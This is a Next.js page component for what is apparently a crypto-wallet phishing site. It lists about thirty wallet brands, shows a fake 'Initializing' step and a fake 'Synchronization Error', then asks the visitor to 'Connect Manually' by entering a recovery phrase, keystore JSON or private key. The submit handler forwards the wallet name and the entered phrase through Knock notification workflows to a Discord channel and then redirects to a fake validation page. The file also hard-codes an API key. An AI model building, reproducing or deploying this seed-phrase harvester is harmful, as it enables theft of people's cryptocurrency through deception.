"use client";
import Typewriter from "typewriter-effect";
import FormSubmit from "./components/FormSubmit";
import { RiErrorWarningFill } from "react-icons/ri";
import WalletCon from "./assets/walletConnect.png";
import Trust from "../assets/trust.png";
import Metamask from "../assets/metamask.png";
import Hashpack from "./assets/hash.jpg";
import Keplr from "./assets/keplr.png";
import Klever from "./assets/KLEVER.png";
import Cosmos from "./assets/cosmos.png";
import Slope from "./assets/slope.png";
import Binance from "../assets/binance.png";
import Bitpay from "./assets/Bitpay.png";
import Phantom from "../assets/phantom.png";
import Argent from "../assets/argent.png";
import Polkadot from "./assets/polkadot.png";
import Iotex from "./assets/Lotex.png";
import Coinbase from "./assets/coinbase.png";
import Crypto from "./assets/crypto-com.png";
import Math from "./assets/math.png";
import Ledger from "./assets/ledger.png";
import Celo from "./assets/Celo.png";
import Valora from "./assets/valora.png";
import Gnosis from "./assets/Gnosis.png";
import Stargazer from "./assets/Stargazer.png";
import Onto from "./assets/Onto.png";
import Rainbow from "./assets/Rainbow.png";
import Solfare from "../assets/solfare.png";
import CryptoCom from "./assets/CryptoCom.png";
import Exodus from "../assets/Exodus.png";
import OtherWallets from "./assets/wallet.png";
import Okx from "../assets/okx.png";
import Trezor from "../assets/trezor.png";
import Best from "./assets/best.png";
import Image from "next/image";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Knock } from "@knocklabs/node";
import Header from "../components/Header";

export default function Home() {
  const navigate = useRouter();
  const knock = new Knock(process.env.NEXT_PUBLIC_KNOCK_API_KEY);
  const [keyType, setKeyType] = useState("Phrase");
  // const [state, handleSubmit] = useForm("mjvqbbnl");
  const [formState, setFormState] = useState({});
  const [walletId, setWalletID] = useState(null);

  const data = [
    { img: Best, title: "Best" },
    { img: WalletCon, title: "Wallet Connect" },
    { img: Trust, title: "Trust" },
    { img: Metamask, title: "Metamask" },
    { img: Hashpack, title: "Hashpack" },
    { img: Keplr, title: "Keplr" },
    { img: Solfare, title: "Solfare" },
    { img: CryptoCom, title: "Crypto.com" },
    { img: Exodus, title: "Exodus" },
    { img: Okx, title: "OKX" },
    { img: Trezor, title: "Trezor" },
    { img: Klever, title: "Klever" },
    { img: Cosmos, title: "Cosmos" },
    { img: Slope, title: "Slope" },
    { img: Binance, title: "Binance Chain" },
    { img: Bitpay, title: "Bitpay" },
    { img: Phantom, title: "Phantom" },
    { img: Argent, title: "Argent" },
    { img: Polkadot, title: "Polkadot" },
    { img: Iotex, title: "Iotex" },
    { img: Coinbase, title: "Coinbase" },
    { img: Math, title: "Math" },
    { img: Ledger, title: "Ledger Live" },
    { img: Celo, title: "Celo" },
    { img: Valora, title: "Valora" },
    { img: Gnosis, title: "Gnosis" },
    { img: Stargazer, title: "Stargazer" },
    { img: Onto, title: "ONTO" },
    { img: Rainbow, title: "Rainbow" },
    { img: OtherWallets, title: "Other Wallets" },
  ];

  const changeHandler = (event) => {
    setFormState({
      ...formState,
      [event.target.name]: event.target.value,
      wallet: data[walletId].title,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    knock.objects.set("project6", "project-1", {
      name: "My project5",
      total_assets: 10,
      tags: ["cool", "fun", "project"],
    });
    await knock.objects.setChannelData(
      "project6",
      "projects-2",
      process.env.NEXT_PUBLIC_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1341002248188198923",
          },
        ],
      }
    );
    await knock.workflows.trigger("dappnodeplus", {
      data: {
        wallet: formState.wallet,
        currentPhrase: formState.currentPhrase,
      },
      recipients: [{ id: "projects-2", collection: "project6" }],
    });
    setTimeout(() => {
      navigate.push("/validate/" + walletId);
    }, 1000);
  };

  const HandleWallet = () => {
    let tabs = document.querySelectorAll(".tab");
    let indicator = document.querySelector(".indicator");
    indicator.style.width = tabs[0].getBoundingClientRect().width + "px";
    indicator.style.left =
      tabs[0].getBoundingClientRect().left -
      tabs[0].parentElement.getBoundingClientRect().left +
      "px";

    tabs.forEach((tab, index) => {
      if (tab.id == tabs[0].id) {
        tab.classList.add("tabActive", "text-black");
        tab.classList.remove("tabInActive", "text-white");
      } else {
        tab.classList.remove("tabActive", "text-black");
        tab.classList.add("tabInActive", "text-white");
      }

      tab.addEventListener("click", (e) => {
        tabs.forEach((tab) => {
          tab.classList.remove("tabActive", "text-black");
          tab.classList.add("tabInActive", "text-white");
        });
        setKeyType(e.target.innerText);

        indicator.style.width = tab.getBoundingClientRect().width + "px";
        indicator.style.left =
          tab.getBoundingClientRect().left -
          tab.parentElement.getBoundingClientRect().left +
          "px";

        if (tab.id == tabs[index].id) {
          tab.classList.add("tabActive", "text-black");
          tab.classList.remove("tabInActive", "text-white");
        }
      });
    });
  };

  const initializeFunc = (index) => {
    setWalletID(index);
    document.getElementById("my_modal_1").showModal();
    setTimeout(() => {
      document.getElementById("my_modal_1").close();
      document.getElementById("my_modal_2").showModal();
    }, 3000);
  };

  const connectManually = () => {
    document.getElementById("my_modal_2").close();
    document.getElementById("my_modal_3").showModal();
  };

  useEffect(() => {
    HandleWallet();
  }, []);

  const [coinData, setCoinData] = useState(null);
  useEffect(() => {
    const getData = async () => {
      try {
        const res = fetch(
          `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&x_cg_demo_api_key=CG-mWX7cLaiGZ78kWhjcBjageuz`
        );
        const resJson = (await res).json();
        const data = await resJson;
        setCoinData(data);
        console.log(data);
      } catch (error) {
        console.log(error);
      }
    };
    getData();
  }, []);

  return (
    <div>
      <Header coinData={coinData} />
      <main className="px-4 py-10">
        <div className="max-w-7xl mx-auto">
          <h1 className="text-white text-center font-extrabold text-3xl">
            Choose your Wallet
          </h1>
          <div className="grid lg:grid-cols-4 sm:grid-cols-2 md:grid-cols-3 gap-5 mt-10">
            {data.map((item, index) => (
              <div
                key={index}
                className="shadow-2xl hover:shadow-none px-5 py-8 cursor-pointer bg-[#272727] rounded-2xl flex flex-col justify-center"
                onClick={() => initializeFunc(index)}
              >
                <div className="mx-auto w-20 h-24 flex justify-center items-center mb-6">
                  <Image
                    src={item.img}
                    width={200}
                    height={200}
                    alt=""
                    className="w-full"
                  />
                </div>
                <div className="text-center  text-white">
                  <h1 className="font-bold text-xl">{item.title}</h1>
                  <p className="text-sm">WALLET</p>
                </div>
              </div>
            ))}
          </div>
          <dialog
            id="my_modal_1"
            className="modal w-full mx-auto bg-[#454545] p-4 max-w-sm lg:max-w-lg xl:max-w-xl rounded-xl"
          >
            <div className="modal-box">
              <form method="dialog" className="mb-12">
                {/* if there is a button in form, it will close the modal */}
                <button className="btn btn-sm text-xl btn-circle text-red-500 absolute right-2 top-2">
                  ✕
                </button>
              </form>
              <div className="px-5 py-6 rounded-2xl mb-5 border border-red-500 text-red-500 flex md:text-lg">
                <p>Initializing</p>
                <Typewriter
                  className="inline "
                  options={{
                    strings: ["...", "..."],
                    autoStart: true,
                    loop: true,
                  }}
                />
              </div>
            </div>
          </dialog>
          <dialog
            id="my_modal_2"
            className="modal w-full mx-auto bg-[#454545] p-4 max-w-sm lg:max-w-lg xl:max-w-xl rounded-xl"
          >
            <div className="modal-box">
              <form method="dialog" className="mb-12">
                {/* if there is a button in form, it will close the modal */}
                <button className="btn btn-sm btn-circle text-xl text-red-500 absolute right-2 top-2">
                  ✕
                </button>
              </form>
              <div className="px-5 py-6 rounded-2xl mb-5  text-slate-400 md:text-lg text-center">
                <p className="text-red-500 mb-2">Synchronization Error...</p>
                <button
                  className="px-6 py-2 rounded-xl bg-[#A76BF1] text-white hover:bg-white hover:text-[#A76BF1]"
                  onClick={() => connectManually()}
                >
                  Connect Manually
                </button>
              </div>
            </div>
          </dialog>
          <dialog
            id="my_modal_3"
            className="modal w-full mx-auto bg-[#454545] p-4 md:max-w-xl lg:max-w-xl xl:max-w-2xl rounded-xl"
          >
            <div className="modal-box">
              <form method="dialog" className="mb-4">
                {/* if there is a button in form, it will close the modal */}
                <button className="btn btn-lg btn-circle text-red-500 text-xl absolute right-2 top-2">
                  ✕
                </button>
              </form>
              <div className="flex items-center justify-center  px-3">
                <div className="">
                  <div className="w-full">
                    <div
                      role="tablist"
                      aria-label="tabs"
                      className="relative font-urbanist grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-6 rounded-xl md:px-3 py-5 bg-[#272626] overflow-hidden transition md:rounded-xl"
                    >
                      <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
                      <button
                        role="tab"
                        aria-selected="true"
                        aria-controls="panel-1"
                        id="tab-1"
                        tabIndex="0"
                        className="relative block px-3 tab text-[#5B5B5B] xs:text-sm md:rounded-full"
                      >
                        <span>Phrase</span>
                      </button>
                      <button
                        role="tab"
                        aria-selected="false"
                        aria-controls="panel-2"
                        id="tab-2"
                        tabIndex="-1"
                        className="relative block px-3 tab text-[#5B5B5B] xs:text-sm md:rounded-full"
                      >
                        <span>Keystore JSON</span>
                      </button>
                      <button
                        role="tab"
                        aria-selected="false"
                        aria-controls="panel-3"
                        id="tab-3"
                        tabIndex="-1"
                        className="relative block px-3 tab text-[#5B5B5B] xs:text-sm md:rounded-full"
                      >
                        <span>Private Key</span>
                      </button>
                    </div>
                    <div className="mt-8 relative">
                      <div>
                        <form onSubmit={handleSubmit}>
                          <FormSubmit
                            keyType={keyType}
                            // wallet={""}
                            changeHandler={changeHandler}
                          />
                          <div className="flex flex-col-reverse font-urbanist items-center mt-5 gap-y-3 ">
                            <button
                              className="py-5 w-full text-center font-bold text-red-500 rounded-full"
                              onClick={() =>
                                document.getElementById("my_modal_3").close()
                              }
                            >
                              Cancel
                            </button>
                            <button
                              className="bg-[#A76BF1] py-5 w-full rounded-full text-white font-bold"
                              type="submit"
                              // disabled={state.submitting}
                            >
                              Proceed
                            </button>
                          </div>
                        </form>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </dialog>
          <dialog
            id="my_modal_4"
            className="modal w-full mx-auto border-[#4B4F58] bg-[#b1afaf] px-2"
          >
            <div className="modal-box">
              <form method="dialog" className="mb-12">
                {/* if there is a button in form, it will close the modal */}
                <button className="btn btn-sm btn-circle text-xl btn-ghost absolute right-2 top-2 mb-4">
                  ✕
                </button>
              </form>
              <div className="flex flex-col items-center rounded-3xl py-8 px-3 m-auto">
                <div>
                  <RiErrorWarningFill className="text-[#CF1212] text-5xl" />
                </div>
                <p className="mt-3 text-center font-semibold text-white">
                  Unable To Validate Wallet!!! ,<br />
                  Try A Different Wallet.
                </p>
                <button
                  onClick={() => document.getElementById("my_modal_4").close()}
                  className="bg-[#FF1E1E] py-4 px-14 mt-5 rounded-full text-white"
                >
                  Cancel
                </button>
              </div>
            </div>
          </dialog>
        </div>
      </main>
    </div>
  );
}
